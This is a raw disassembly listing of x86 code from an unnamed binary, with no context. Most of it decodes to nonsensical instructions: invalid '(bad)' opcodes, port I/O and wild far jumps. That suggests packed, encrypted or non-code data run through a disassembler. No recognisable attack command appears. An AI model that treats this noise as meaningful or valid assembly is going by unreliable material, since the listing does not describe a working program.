  405ea0:	shl    DWORD PTR [ebx-0x22023f7],0xe7
  405ea7:	and    DWORD PTR [edx],esp
  405ea9:	stos   DWORD PTR es:[edi],eax
  405eaa:	aam    0x7f
  405eac:	lods   al,BYTE PTR ds:[esi]
  405ead:	ja     0x405f01
  405eaf:	xchg   esi,eax
  405eb0:	push   edi
  405eb1:	pop    edi
  405eb2:	jmp    0x6c3a2306
  405eb7:	in     al,dx
  405eb8:	xor    eax,0xbd4dc1ba
  405ebd:	inc    ebp
  405ebe:	pop    ebp
  405ebf:	sub    DWORD PTR [esi+ecx*8+0x27],esp
  405ec3:	into   
  405ec4:	pop    eax
  405ec5:	shr    dh,cl
  405ec7:	dec    esp
  405ec8:	loope  0x405e81
  405eca:	inc    edx
  405ecb:	adc    DWORD PTR [ecx-0x7d],ebp
  405ece:	scas   eax,DWORD PTR es:[edi]
  405ecf:	pop    ss
  405ed0:	scas   al,BYTE PTR es:[edi]
  405ed1:	sub    BYTE PTR [esi-0x29],dh
  405ed4:	mov    esp,cs
  405ed6:	int3   
  405ed7:	adc    al,BYTE PTR [eax+0x1656e345]
  405edd:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  405edf:	stos   DWORD PTR es:[edi],eax
  405ee0:	dec    ecx
  405ee1:	cmp    al,0xf1
  405ee3:	and    cl,bl
  405ee5:	dec    esi
  405ee6:	outs   dx,BYTE PTR ds:[esi]
  405ee7:	sub    DWORD PTR [esi-0x49],ebx
  405eea:	dec    ecx
  405eeb:	retf   
  405eec:	shr    BYTE PTR [edi],1
  405eee:	xchg   edi,eax
  405eef:	pop    esp
  405ef0:	enter  0x5265,0x79
  405ef4:	cmp    eax,0x274e0aa6
  405ef9:	cmp    dl,ch
  405efb:	mov    ds:0x92bec037,al
  405f00:	jno    0x405f79
  405f02:	stc    
  405f03:	pop    es
  405f04:	xchg   esi,eax
  405f05:	fstp   TBYTE PTR [eax+0x201c8820]
  405f0b:	(bad)  
  405f0c:	jb     0x405f25
  405f0e:	into   
  405f0f:	mov    BYTE PTR [eax+0x2],cl
  405f12:	mov    bl,dl
  405f14:	stos   BYTE PTR es:[di],al
  405f16:	cmc    
  405f17:	(bad)  [eax+0xfe55bfc]
  405f1d:	xor    bh,BYTE PTR [ebx+0x7b]
  405f20:	imul   BYTE PTR [esi+esi*2+0x7c9839a0]
  405f27:	(bad)
  405f2b:	xor    al,BYTE PTR [edx+0x1a]
  405f2e:	cmp    DWORD PTR [ebp-0x375ae517],edi
  405f34:	ins    BYTE PTR es:[edi],dx
  405f35:	test   DWORD PTR [esi+ecx*1-0x60969c62],0xb839c9b
  405f40:	pop    esi
  405f41:	sub    DWORD PTR [ebp+0x48],edi
  405f44:	call   0xbcf68270
  405f49:	sti    
  405f4a:	dec    edx
  405f4b:	mov    BYTE PTR [ebx-0x46],bl
  405f4e:	fs push eax
  405f50:	pop    esp
  405f51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f52:	add    DWORD PTR ds:0x9131a39c,ebp
  405f58:	sub    eax,0xb64000e3
  405f5d:	loopne 0x405f6d
  405f5f:	lds    ecx,FWORD PTR [ebp+edi*4+0x34]
  405f63:	cmp    DWORD PTR [esi+0x36b73786],esp
  405f69:	xor    dh,BYTE PTR [esi+0x64]
  405f6c:	push   esi
  405f6d:	(bad)  
  405f6e:	and    dl,BYTE PTR [ebx-0x6f756f7c]
  405f74:	or     eax,0x9b1f0ac3
  405f79:	cmp    bl,BYTE PTR [edx-0x4da2fd70]
  405f7f:	xor    esi,esp
  405f81:	jp     0x405fb0
  405f83:	sbb    eax,0x9f48dd39
  405f88:	xchg   ecx,eax
  405f89:	jmp    0x405f4c
  405f8b:	and    al,0x78
  405f8d:	jmp    0x405f41
  405f8f:	loop   0x406008
  405f91:	sbb    eax,ecx
  405f93:	jnp    0x405f27
  405f95:	data16 jae 0x405fd7
  405f98:	enter  0x3de9,0xc6
  405f9c:	call   0x3143:0x2a6c304d
  405fa3:	ins    DWORD PTR es:[edi],dx
  405fa4:	test   al,0xcf
  405fa6:	popa   
  405fa7:	(bad)  
  405fa8:	push   ebp
  405fa9:	and    dh,BYTE PTR [esi+0x17]
  405fac:	test   al,0xb1
  405fae:	dec    edx
  405faf:	mov    ebx,0xfa734389
  405fb4:	call   0xaf5:0x82b38799
  405fbb:	and    al,0xc9
  405fbd:	nop
  405fbe:	inc    esi
  405fbf:	dec    esp
  405fc0:	push   eax
  405fc1:	fist   DWORD PTR [ebx-0xa]
  405fc4:	xlat   BYTE PTR ds:[ebx]
  405fc5:	(bad)  
  405fc6:	cmp    DWORD PTR [edx+ebx*2+0x55],esp
  405fca:	pop    esp
  405fcb:	(bad)  
  405fcc:	jne    0x405fae
  405fce:	sub    ebp,edx
  405fd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fd1:	mov    eax,0x93b330ae
  405fd6:	sbb    DWORD PTR [edi+esi*2],esi
  405fd9:	sbb    eax,0x14211885
  405fde:	dec    esp
  405fdf:	push   edx
  405fe0:	enter  0xaa99,0x4c
  405fe4:	jo     0x406058
  405fe6:	das    
  405fe7:	loop   0x405fd1
  405fe9:	or     ah,BYTE PTR [ecx-0x73]
  405fec:	in     al,dx
  405fed:	fisttp WORD PTR [esi-0x27]
  405ff0:	clc    
  405ff1:	mov    esi,0x3647ae5e
  405ff6:	sbb    BYTE PTR [edx-0x17],ah
  405ff9:	into   
  405ffa:	adc    ebp,DWORD PTR [ecx]
  405ffc:	leave  
  405ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405fff:	push   0x35811804
  406004:	rcr    DWORD PTR [esi+0x2d],1
  406007:	call   0x3ce5:0xd3551a73
  40600e:	mov    ebp,0x8e448fed
  406013:	loop   0x40600a
  406015:	cmp    al,0x6b
  406017:	cmp    al,dh
  406019:	mov    eax,ds:0x9137f69e
  40601e:	test   cl,dl
  406020:	pmaxsw mm4,QWORD PTR [edi+0x5e]
  406024:	mov    al,ds:0x88989d4b
  406029:	pop    es
  40602a:	fisubr WORD PTR [ebx-0x4e]
  40602d:	dec    esi
  40602e:	and    al,0x3e
  406030:	sub    bl,0x56
  406033:	hlt    
  406034:	pop    esi
  406035:	std    
  406036:	sti    
  406037:	test   DWORD PTR [ebx+0x46],edi
  40603a:	loope  0x405fd4
  40603c:	xchg   ecx,eax
  40603d:	ret    
  40603e:	out    dx,eax
  40603f:	out    0xc4,eax
  406041:	mov    ah,0x77
  406043:	and    ch,BYTE PTR [ebx]
  406045:	into   
  406046:	add    BYTE PTR [ebx],bl
  406048:	in     eax,0xd4
  40604a:	lock icebp 
  40604c:	mov    ah,0x3c
  40604e:	jnp    0x405fef
  406050:	pop    ecx
  406051:	ret    
  406052:	lods   al,BYTE PTR ds:[esi]
  406053:	pop    edx
  406054:	xchg   edx,eax
  406055:	pop    eax
  406056:	mov    ds:0xf4f2a1d5,al
  40605b:	inc    eax
  40605c:	push   eax
  40605d:	inc    edi
  40605e:	imul   edx,esi,0xffffffac
  406061:	dec    esi
  406062:	(bad)  
  406064:	pop    edx
  406065:	in     eax,dx
  406066:	cwde   
  406067:	leave  
  406068:	popf   
  406069:	xchg   DWORD PTR fs:[esi],ebx
  40606c:	mov    DWORD PTR [ecx-0x5e],esp
  40606f:	shl    edx,0x95
  406072:	in     eax,0xb3
  406074:	xchg   esp,eax
  406075:	loopne 0x4060a2
  406077:	lds    ebx,FWORD PTR [edx-0xc69c26]
  40607d:	jns    0x4060a1
  40607f:	mov    bl,0xa5
  406081:	mov    cl,0x3e
  406083:	mov    al,0x26
  406085:	ins    BYTE PTR es:[edi],dx
  406086:	mov    es,esp
  406088:	popa   
  406089:	daa    
  40608a:	fidiv  WORD PTR [edi-0x4f]
  40608d:	ret    
  40608e:	inc    eax
  40608f:	jp     0x406019
  406091:	xchg   DWORD PTR [eax+0x38],edx
  406094:	adc    eax,0x24
  406097:	fwait
  406098:	arpl   ax,bx
  40609a:	out    dx,al
  40609b:	int    0x2
  40609d:	xor    BYTE PTR [ecx+0x5d],ah
  4060a0:	cdq    
  4060a1:	cwde   
  4060a2:	pop    ecx
  4060a3:	cdq    
  4060a4:	add    eax,0x162ace04
  4060a9:	add    ebx,DWORD PTR [ebp+edx*4-0x276142e1]
  4060b0:	xor    BYTE PTR [edx-0x38],ah
  4060b3:	xlat   BYTE PTR ds:[ebx]
  4060b4:	inc    esi
  4060b5:	clc    
  4060b6:	xor    al,0x28
  4060b8:	pop    es
  4060b9:	adc    esi,DWORD PTR [edi+0x39b49fb2]
  4060bf:	int    0xc8
  4060c1:	mov    ebx,0x9c4d13e
  4060c6:	in     al,0xca
  4060c8:	int3   
  4060c9:	out    0x45,eax
  4060cb:	retf   
  4060cc:	xchg   cl,bh
  4060ce:	stos   BYTE PTR es:[edi],al
  4060cf:	mov    ebx,0xf6d51464
  4060d4:	shl    BYTE PTR [edx-0x357ae566],1
  4060da:	mov    bh,0x61
  4060dc:	fmul   DWORD PTR [edx-0x1eecd93d]
  4060e2:	outs   dx,DWORD PTR ds:[esi]
  4060e3:	jbe    0xbeacdfa8
  4060e9:	in     al,0x75
  4060eb:	repz loop 0x4060ea
  4060ee:	sub    al,0x72
  4060f0:	call   0x8de6baf0
  4060f5:	rcr    BYTE PTR [edi-0x7d95fe1b],cl
  4060fb:	cmc    
  4060fc:	pop    ss
  4060fd:	pop    ss
  4060fe:	mov    ch,0x78
  406100:	aad    0xce
  406102:	dec    ecx
  406103:	ret    
  406104:	js     0x4060a4
  406106:	add    bh,BYTE PTR [ecx+0x7a]
  406109:	pusha  
  40610a:	rol    dl,0xdd
  40610d:	xor    ebp,DWORD PTR [ecx-0x34]
  406110:	and    edi,DWORD PTR [esi+eiz*8-0x5f]
  406114:	jb     0x4060af
  406116:	or     BYTE PTR [esp+eax*4-0x33],dl
  40611a:	or     ch,BYTE PTR [edi+0x67]
  40611d:	call   0x4f08:0xdf6565ff
  406124:	aas    
  406125:	cmp    al,0x2c
  406127:	adc    esi,ebp
  406129:	mov    edi,0xbf1c6199
  40612e:	push   ebp
  40612f:	mov    eax,ds:0x5c366f9
  406134:	mov    BYTE PTR [esi],dl
  406136:	xor    eax,0xc208ddb4
  40613b:	jmp    0x681bb11c
  406140:	inc    ebx
  406141:	popf   
  406142:	xlat   BYTE PTR ds:[ebx]
  406143:	mov    ch,BYTE PTR [esi]
  406145:	int3   
  406146:	dec    eax
  406147:	cmp    al,bl
  406149:	es ins BYTE PTR es:[edi],dx
  40614b:	retf   
  40614c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40614d:	jns    0x4060e3
  40614f:	or     al,0xb3
  406151:	sub    dh,ah
  406153:	fld    DWORD PTR [ecx+eiz*4]
  406156:	xchg   ebx,eax
  406157:	jmp    0x4061af
  406159:	in     al,0x18
  40615b:	mov    eax,ds:0xb478347a
  406160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406161:	mov    al,0xe9
  406163:	mov    ds:0xb991f91,eax
  406168:	js     0x4061ce
  40616a:	or     esp,esp
  40616c:	pop    ecx
  40616d:	(bad)
  406170:	xchg   edi,eax
  406171:	cmp    bl,BYTE PTR ds:0xd678feda
  406177:	or     BYTE PTR [edi],dl
  406179:	rcl    esp,0x36
  40617c:	ja     0x4061f0
  40617e:	push   ds
  40617f:	(bad)  
  406180:	jmp    0x3bdcbb3a
  406185:	or     al,0xb5
  406187:	jne    0x406165
  406189:	sbb    DWORD PTR [edx+edi*4-0x50fe832a],ebp
  406190:	in     eax,0x9c
  406192:	call   0xf59c2e64
  406197:	lds    esp,FWORD PTR [edx+0xd4eb39c]
  40619d:	or     BYTE PTR ds:0x1c7e15a6,ch
  4061a3:	mov    ebx,0x175a8bb0
  4061a8:	xchg   ebp,eax
  4061a9:	push   0xbfb1e688
  4061ae:	push   cs
  4061af:	retf   0xa0a6
  4061b2:	repnz popa 
  4061b4:	sub    esp,DWORD PTR [ecx+0x11]
  4061b7:	test   BYTE PTR [ebx-0x39db0347],dl
  4061bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061be:	sub    cl,BYTE PTR [ecx-0x78]
  4061c1:	enter  0xbc42,0x7a
  4061c5:	loop   0x40618b
  4061c7:	adc    cl,bh
  4061c9:	(bad)  
  4061ca:	lahf   
  4061cb:	xchg   esp,eax
  4061cc:	loopne 0x40616e
  4061ce:	or     ebp,DWORD PTR [edx+esi*8-0x4b6ec4c8]
  4061d5:	aam    0xc
  4061d7:	sbb    eax,0xc747053a
  4061dc:	jg     0x40625a
  4061de:	inc    ebx
  4061df:	push   ebp
  4061e0:	or     esp,DWORD PTR [ecx*4+0x1dd10cbc]
  4061e7:	div    BYTE PTR [ecx+ebp*1]
  4061ea:	leave  
  4061eb:	jge    0x406231
  4061ed:	ds push ebp
  4061ef:	(bad)  
  4061f0:	mov    WORD PTR [edx+0x6],ds
  4061f3:	cdq    
  4061f4:	adc    cl,0x44
  4061f7:	mov    dl,dl
  4061f9:	mov    bl,0xad
  4061fb:	repz popf 
  4061fd:	data16 arpl WORD PTR [ecx],cx
  406200:	jmp    0xca0e0150
  406205:	mov    eax,edx
  406207:	mov    eax,ds:0x6cb0a964
  40620c:	iret   
  40620d:	fmul   DWORD PTR [eax+0x1a3b8349]
  406213:	or     eax,0xd0df4191
  406218:	add    eax,0x741fb3d5
  40621d:	mov    eax,0x5a27da44
  406222:	bound  esp,QWORD PTR [esi-0x65bd17b8]
  406228:	(bad)
  40622d:	pop    ebp
  40622e:	pop    esp
  40622f:	sbb    al,0x92
  406231:	xor    esp,DWORD PTR [ecx+0x38]
  406234:	xlat   BYTE PTR ds:[ebx]
  406235:	(bad)  
  406236:	in     al,0x12
  406238:	neg    dl
  40623a:	and    bh,BYTE PTR [ecx-0x5]
  40623d:	xchg   ebp,eax
  40623e:	jle    0x4061e6
  406240:	(bad)  
  406241:	or     BYTE PTR [ebp+0x7786c0f0],ch
  406247:	loope  0x40629e
  406249:	shl    cl,cl
  40624b:	iret   
  40624c:	xchg   edi,eax
  40624d:	sahf   
  40624e:	dec    ebx
  40624f:	dec    esi
  406250:	js     0x406252
  406252:	cmp    al,0x22
  406254:	mov    edx,0xca9f92fd
  406259:	retf   0x262c
  40625c:	int    0xba
  40625e:	sbb    eax,0x390aa23a
  406263:	push   cs
  406264:	aaa    
  406265:	jbe    0x4061ef
  406267:	call   0x3632bf3
  40626c:	sub    edx,DWORD PTR [esi]
  40626e:	ins    BYTE PTR es:[edi],dx
  40626f:	inc    ecx
  406270:	iret   
  406271:	ins    BYTE PTR es:[edi],dx
  406272:	clc    
  406273:	mov    edx,0xc65bebf6
  406278:	xor    al,0x3
  40627a:	mov    al,ds:0xb43f2c8b
  40627f:	pop    ebx
  406280:	test   eax,0x51f8d83c
  406286:	and    bh,BYTE PTR [ebx+eax*1]
  406289:	sub    esp,DWORD PTR [ecx+0xe842411]
  40628f:	xlat   BYTE PTR ds:[ebx]
  406290:	mov    esp,0x66e9e926
  406295:	jp     0x4062a6
  406297:	mov    edx,0x39fbd80f
  40629c:	sbb    ch,BYTE PTR [eax+0x7e]
  40629f:	arpl   dx,sp
  4062a1:	dec    eax
  4062a2:	out    dx,al
  4062a3:	push   edx
  4062a4:	mov    al,dh
  4062a6:	pop    esi
  4062a7:	test   DWORD PTR [ebp+0x33339b84],ebx
  4062ad:	sub    edi,eax
  4062af:	cmc    
  4062b0:	shr    BYTE PTR [edx+edi*1],cl
  4062b3:	(bad)
  4062b7:	iret   
  4062b8:	bound  eax,QWORD PTR [edi+0x2d]
  4062bb:	inc    ecx
  4062bc:	arpl   si,bx
  4062be:	sbb    DWORD PTR [edx],eax
  4062c0:	imul   esi,DWORD PTR [esi-0x4d4eefd1],0xffffffb2
  4062c7:	lods   al,BYTE PTR ds:[esi]
  4062c8:	(bad)  
  4062c9:	mov    edx,0xa61fb295
  4062ce:	int3   
  4062cf:	mov    ecx,0x9cc3cdf8
  4062d4:	mov    ebx,0x4058a6ec
  4062d9:	(bad)  
  4062da:	or     BYTE PTR [ecx+0x48],dh
  4062dd:	repz aad 0x8a
  4062e0:	mov    cl,0x55
  4062e2:	mov    esi,ebp
  4062e4:	loop   0x4062fe
  4062e6:	ins    DWORD PTR es:[edi],dx
  4062e7:	aam    0xf8
  4062e9:	jg     0x406292
  4062eb:	jecxz  0x4062d5
  4062ed:	sbb    bh,BYTE PTR [edx-0x75]
  4062f0:	add    eax,0x56d5c498
  4062f5:	cli    
  4062f6:	ins    DWORD PTR es:[edi],dx
  4062f7:	inc    ebx
  4062f8:	mov    ecx,0xeba3f293
  4062fd:	jp     0x4062a1
  4062ff:	pop    esi
  406300:	or     DWORD PTR [edx+0x7c],0xffffffc8
  406304:	push   ds
  406305:	jno    0x40631b
  406307:	aad    0x54
  406309:	rcr    DWORD PTR [edx],cl
  40630b:	cmp    esi,DWORD PTR [ebp+0x4f719ee2]
  406311:	and    ebp,DWORD PTR ds:0xa2861259
  406317:	std    
  406318:	and    al,0x62
  40631a:	(bad)  
  40631b:	and    edx,esp
  40631d:	stc    
  40631e:	adc    ch,BYTE PTR [ebx+0x14]
  406321:	sub    DWORD PTR [edi-0x1e4c2a7f],esp
  406327:	call   0x8d62ec8b
  40632c:	jnp    0x406350
  40632e:	out    dx,eax
  40632f:	nop
  406330:	cs jle 0x406322
  406333:	mov    ds:0xde85f58f,al
  406338:	sbb    eax,0x27adc5be
  40633d:	add    DWORD PTR [ebp+0x9],eax
  406340:	jnp    0x4062ee
  406342:	mov    DWORD PTR [ebx],esp
  406344:	fsub   st(6),st
  406346:	std    
  406347:	sub    BYTE PTR [ebx-0x20],bh
  40634a:	jb     0x4062ed
  40634c:	icebp  
  40634d:	inc    ecx
  40634e:	push   0xad2d3362
  406353:	adc    al,0xb
  406355:	cmp    DWORD PTR [edx+0x75],eax
  406358:	add    ebp,0xbd3fafd3
  40635e:	or     eax,DWORD PTR [esi+0x1c14b3f4]
  406364:	loope  0x4063e5
  406366:	leave  
  406367:	in     al,dx
  406368:	mov    eax,ds:0x951c6230
  40636d:	ins    BYTE PTR es:[edi],dx
  40636e:	mov    ebp,0x14c364a8
  406373:	or     ah,BYTE PTR [ebp+0x13677fd1]
  406379:	call   0xc2ab:0x3e46d5dd
  406380:	imul   esi,DWORD PTR [ecx+0x1eee6d6c],0x74
  406387:	call   0xd03f:0x33688849
  40638e:	sbb    edi,esi
  406390:	add    DWORD PTR [esi+0x48],0x12ca33d7
  406397:	int    0xad
  406399:	pop    ss
  40639a:	outs   dx,DWORD PTR ds:[esi]
  40639b:	cwde   
  40639c:	ss sub eax,0xf34886b0
  4063a2:	(bad)  [ebx-0x6f8876d6]
  4063a8:	inc    eax
  4063a9:	shr    DWORD PTR [edx+0x6b],0xfa
  4063ad:	imul   edi,DWORD PTR [eax+0x43],0xffffff90
  4063b1:	inc    edx
  4063b2:	mov    ds:0xab404685,eax
  4063b7:	fs push ss
  4063b9:	xlat   BYTE PTR ds:[ebx]
  4063ba:	cwde   
  4063bb:	outs   dx,DWORD PTR ds:[esi]
  4063bc:	aaa    
  4063bd:	cmc    
  4063be:	jnp    0x406355
  4063c0:	or     bl,BYTE PTR [ebx+0x504725d]
  4063c6:	xor    al,0xd7
  4063c8:	jb     0x4063dd
  4063ca:	mov    bh,0x67
  4063cc:	sar    DWORD PTR [ebp-0x367d2af6],0xe6
  4063d3:	dec    esp
  4063d4:	inc    ebp
  4063d5:	dec    esp
  4063d6:	lahf   
  4063d7:	bound  edx,QWORD PTR [ebp+0x64]
  4063da:	std    
  4063db:	and    eax,0x32306e2d
  4063e0:	sub    BYTE PTR [edx+0x134340d5],cl
  4063e6:	in     eax,0xef
  4063e8:	dec    eax
  4063e9:	sar    DWORD PTR [edx+ebp*1],1
  4063ec:	or     esp,DWORD PTR [esi-0x7a]
  4063ef:	lods   al,BYTE PTR ds:[esi]
  4063f0:	xchg   DWORD PTR [edi+0x7c256fd],esp
  4063f6:	es jp  0x406431
  4063f9:	mov    BYTE PTR [esi-0x4e],0x3
  4063fd:	mov    edx,0x3908c263
  406402:	(bad)  
  406403:	mov    BYTE PTR [edi],bh
  406405:	fisttp WORD PTR [edx]
  406407:	mov    ds:0xa856ef55,al
  40640c:	jg     0x4063ea
  40640e:	cmp    DWORD PTR [edx+0x7a1faf05],ebp
  406414:	dec    edi
  406415:	aad    0xc5
  406417:	pop    ebp
  406418:	cmp    DWORD PTR [esi],edx
  40641a:	les    eax,FWORD PTR [edi]
  40641c:	int    0xc4
  40641e:	pop    ds
  40641f:	arpl   WORD PTR [edi+0x1f],cx
  406422:	popa   
  406423:	xor    ebx,esp
  406425:	scas   al,BYTE PTR es:[edi]
  406426:	test   al,0x9a
  406428:	mov    ebp,0xdf6f0b22
  40642d:	and    DWORD PTR [esi+edi*2+0x3a5c5dd5],ebp
  406434:	dec    ebp
  406435:	mov    dl,0x0
  406437:	xchg   edi,eax
  406438:	add    cl,dl
  40643a:	shr    BYTE PTR [ebx],1
  40643c:	fucom  st(1)
  40643e:	test   BYTE PTR [ebp+0x2fb3d14b],cl
  406444:	pop    ebx
  406445:	lods   al,BYTE PTR ds:[esi]
  406446:	fst    DWORD PTR [edx]
  406448:	or     al,0x36
  40644a:	and    eax,0x1957a532
  40644f:	pop    ss
  406450:	xchg   ebx,eax
  406451:	pop    ebp
  406452:	scas   al,BYTE PTR es:[edi]
  406453:	stc    
  406454:	xchg   edi,eax
  406455:	jmp    0x4063f9
  406457:	sahf   
  406458:	jno    0x4063dc
  40645a:	sti    
  40645b:	lds    edx,FWORD PTR ss:[edx-0x30944c25]
  406462:	add    BYTE PTR [ebx],0x90
  406465:	mov    ch,0x26
  406467:	setae  BYTE PTR [ebx]
  40646a:	pop    edi
  40646b:	inc    edi
  40646c:	xor    DWORD PTR [eax],eax
  40646e:	jns    0x4064ea
  406470:	out    0x69,eax
  406472:	popf   
  406473:	add    eax,0x5d5d0d9e
  406478:	sub    BYTE PTR [ecx],0x8e
  40647b:	mov    al,0xe4
  40647d:	and    ebx,esi
  40647f:	xchg   ebx,eax
  406480:	ja     0x4064b4
  406482:	mov    bl,BYTE PTR [eax+0x61]
  406485:	mov    ebp,0x189b0b9d
  40648a:	xchg   BYTE PTR [ebx],ah
  40648c:	jns    0x4064bf
  40648e:	push   ecx
  40648f:	or     BYTE PTR [ebx+0x6],bh
  406492:	push   eax
  406493:	(bad)  
  406494:	fild   WORD PTR [ecx+0x6df51640]
  40649a:	jne    0x4064c0
  40649c:	xlat   BYTE PTR ds:[ebx]
  40649d:	inc    ebp
  40649e:	jg     0x4064f9
  4064a0:	pop    edi
  4064a1:	mov    al,ds:0xfaad95bd
  4064a6:	nop
  4064a7:	aad    0x7e
  4064a9:	push   eax
  4064aa:	cli    
  4064ab:	in     al,0xa4
  4064ad:	ins    BYTE PTR es:[edi],dx
  4064ae:	push   ecx
  4064af:	fwait
  4064b0:	adc    al,0x46
  4064b2:	jnp    0x4064a9
  4064b4:	push   es
  4064b5:	sub    al,0x50
  4064b7:	jne    0x406441
  4064b9:	or     eax,0xff3c5bc6
  4064be:	jecxz  0x406512
  4064c0:	inc    edx
  4064c1:	and    BYTE PTR [eax-0x7878e507],dh
  4064c7:	mov    eax,ds:0xe105d14
  4064cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064cd:	imul   edx,DWORD PTR [ecx+0x40],0x4c
  4064d1:	add    ch,BYTE PTR [edi+eax*1+0x79330d54]
  4064d8:	cmp    BYTE PTR [edi*2+0x776e6a57],cl
  4064df:	add    al,0xb5
  4064e1:	pushw  0xfff0
  4064e4:	shl    BYTE PTR [ebx+0x6a],cl
  4064e7:	mov    edi,0xc7543b1b
  4064ec:	out    dx,al
  4064ed:	dec    ecx
  4064ee:	jecxz  0x406487
  4064f0:	xchg   esp,eax
  4064f1:	jb     0x406511
  4064f3:	dec    edi
  4064f4:	mov    ebx,0x1d95301a
  4064f9:	lock inc edi
  4064fb:	add    eax,0x1f7fa71d
  406500:	mov    al,0x6b
  406502:	jb     0x40655f
  406504:	das    
  406505:	xchg   ebp,eax
  406506:	xor    eax,0xa61fe267
  40650b:	or     dh,al
  40650d:	dec    eax
  40650e:	add    DWORD PTR [ebx+0x7f53e089],ebx
  406514:	xor    esp,DWORD PTR [ebx+0x37b83a83]
  40651a:	mov    al,0x52
  40651c:	es push esi
  40651e:	pop    ecx
  40651f:	enter  0x169a,0x75
  406523:	loop   0x4064e7
  406525:	xor    DWORD PTR [ebx],esp
  406527:	rcl    BYTE PTR [ecx-0xd],1
  40652a:	fnstenv [esi+0x5f]
  40652d:	xor    BYTE PTR [ebx],ah
  40652f:	adc    DWORD PTR [ecx],esi
  406531:	sub    eax,0x3ccafb00
  406536:	stc    
  406537:	xchg   edx,eax
  406538:	fdivrp st(5),st
  40653a:	rcr    BYTE PTR [ebx-0xdf6624e],1
  406540:	inc    di
  406542:	jl     0x4065a3
  406544:	jbe    0x4065ad
  406546:	jl     0x4064ff
  406548:	sbb    BYTE PTR [ebx-0x13a59fb3],bh
  40654e:	outs   dx,BYTE PTR ds:[esi]
  40654f:	jge    0x4065bd
  406551:	sbb    cl,BYTE PTR [ecx-0x41]
  406554:	inc    edi
  406555:	mov    ecx,DWORD PTR [edi]
  406557:	scas   eax,DWORD PTR es:[edi]
  406558:	aam    0x9f
  40655a:	dec    edx
  40655b:	aas    
  40655c:	imul   BYTE PTR [ebx-0x54]
  40655f:	retf   0x2c8b
  406562:	mov    BYTE PTR [edx+0x3bb9c6e7],ch
  406568:	push   0x12df8a86
  40656d:	pop    edi
  40656e:	imul   DWORD PTR [eax+0x1d]
  406571:	mov    esp,0x6067467f
  406576:	ror    DWORD PTR [ebx+0xc],0x61
  40657a:	adc    al,0x46
  40657c:	adc    ebp,edx
  40657e:	push   ebp
  40657f:	inc    esp
  406580:	jnp    0x406535
  406582:	lds    ebx,FWORD PTR ds:0x6046c551
  406588:	repnz mov eax,ds:0x3a3746a9
  40658e:	mov    ds:0xf2a0c93e,al
  406593:	sub    eax,0x1b8cff33
  406598:	push   ds
  406599:	mov    ebx,0xc13913f
  40659e:	aaa    
  40659f:	jmp    0x12ec3984
  4065a4:	jmp    0x3bfa:0x70f19b9a
  4065ab:	or     dl,BYTE PTR [eax-0x7b]
  4065ae:	sti    
  4065af:	pop    ebx
  4065b0:	data16 xchg ah,dh
  4065b3:	loope  0x4065b9
  4065b5:	(bad)  
  4065b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065b8:	push   ecx
  4065b9:	test   al,0x25
  4065bb:	cld    
  4065bc:	mov    edx,0xa79e7cf1
  4065c1:	out    0x31,al
  4065c3:	xor    al,0x9d
  4065c5:	scas   al,BYTE PTR es:[edi]
  4065c6:	mov    ch,0x33
  4065c8:	push   ecx
  4065c9:	sahf   
  4065ca:	push   esi
  4065cb:	retf   
  4065cc:	cdq    
  4065cd:	mov    bh,0xc5
  4065cf:	fadd   DWORD PTR [ebx]
  4065d1:	into   
  4065d2:	xchg   edx,eax
  4065d3:	xchg   esi,eax
  4065d4:	fldl2e 
  4065d6:	mov    esp,0xb3c2b368
  4065db:	mov    bl,BYTE PTR [ebp-0x2a]
  4065de:	cmp    eax,0x3f8ea84e
  4065e3:	ss pop eax
  4065e5:	mov    ds:0x5569eaab,eax
  4065ea:	jnp    0x406604
  4065ec:	sti    
  4065ed:	cmp    al,BYTE PTR [esp+edx*8+0x74]
  4065f1:	in     eax,0x60
  4065f3:	inc    edi
  4065f4:	es stos DWORD PTR es:[edi],eax
  4065f6:	stos   BYTE PTR es:[edi],al
  4065f7:	dec    ebp
  4065f8:	sbb    ecx,DWORD PTR [edx-0x6e]
  4065fb:	sbb    eax,0x5d83fdfa
  406600:	pop    esi
  406601:	add    BYTE PTR [edx+0x1b],bh
  406604:	mov    DWORD PTR [esi+0x71afcba8],ebp
  40660a:	jbe    0x40659d
  40660c:	ins    BYTE PTR es:[edi],dx
  40660d:	or     DWORD PTR [eax+ebx*8+0x6e],edi
  406611:	adc    ch,BYTE PTR [ebp+0x2d]
  406614:	sbb    eax,eax
  406616:	xchg   edi,eax
  406617:	push   ecx
  406618:	jno    0x40664f
  40661a:	and    eax,0xabed70e6
  40661f:	cmp    dh,BYTE PTR [ebx+0x78827a6d]
  406625:	aas    
  406626:	lods   al,BYTE PTR ds:[esi]
  406627:	inc    esi
  406628:	pop    esp
  406629:	add    DWORD PTR [edi],edx
  40662b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40662c:	inc    esi
  40662d:	aas    
  40662e:	push   ebp
  40662f:	(bad)  
  406630:	xchg   esp,eax
  406631:	and    ebx,DWORD PTR [ebx+0x1]
  406634:	jae    0x40663e
  406636:	cld    
  406637:	push   esi
  406638:	adc    BYTE PTR [esi+0x704f478d],bl
  40663e:	ja     0x40665f
  406640:	lock je 0x4066bc
  406643:	into   
  406644:	aam    0xea
  406646:	mov    ds:0xb56bd91c,eax
  40664b:	inc    esi
  40664c:	mov    ds:0x6bbb12bc,eax
  406651:	mov    esp,esp
  406653:	pop    esi
  406654:	lds    ebx,FWORD PTR [ebp+0x7e]
  406657:	retf   
  406658:	or     eax,edi
  40665a:	xchg   ecx,eax
  40665b:	pop    es
  40665c:	pusha  
  40665d:	push   0xffffffe8
  40665f:	fwait
  406660:	mov    ebx,0x77dedd4f
  406665:	jp     0x4066d9
  406667:	mov    edi,0x81aff88
  40666c:	push   ebx
  40666d:	les    edx,FWORD PTR [ecx+0x2c]
  406670:	adc    ebx,DWORD PTR [edx-0x2f]
  406673:	xchg   edi,eax
  406674:	and    dl,dh
  406676:	jno    0x4066d8
